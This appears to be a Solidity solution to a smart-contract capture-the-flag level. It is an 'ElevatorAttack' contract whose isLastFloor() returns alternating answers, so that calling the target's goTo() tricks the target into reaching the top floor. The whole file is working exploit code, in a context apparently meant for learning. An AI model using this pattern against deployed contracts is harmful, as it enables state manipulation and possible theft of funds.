// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract ElevatorAttack {
    address target;
    bool private toggle = true;

    constructor(address _target) {
        target = _target;
    }

    function isLastFloor(uint256 /*_floor*/) external returns (bool) {
        toggle = !toggle;
        return toggle;
    }

    function attack() external {
        (bool success, ) = target.call(abi.encodeWithSignature("goTo(uint256)", 1));
        require(success, "call failed");
    }
}
